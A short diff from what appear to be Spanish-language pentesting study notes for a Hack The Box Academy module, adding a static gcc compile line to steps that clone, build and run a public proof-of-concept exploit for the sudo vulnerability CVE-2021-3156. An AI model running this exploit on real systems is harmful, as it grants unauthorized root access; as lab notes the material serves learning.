@@ -709,6 +709,8 @@ TODO: en [htb](https://academy.hackthebox.com/module/51/section/1640)
 	```bash
 	git clone https://github.com/blasty/CVE-2021-3156.git
 	cd CVE-2021-3156
+	# yo añado el static a la siguiente línea para compilarlo localmente en el Makefile
+	gcc -std=c99 -static -o sudo-hax-me-a-sandwich hax.c
 	make
 	# Una vez instalado correr el script y nos dará versiones que elegir
 	./sudo-hax-me-a-sandwich
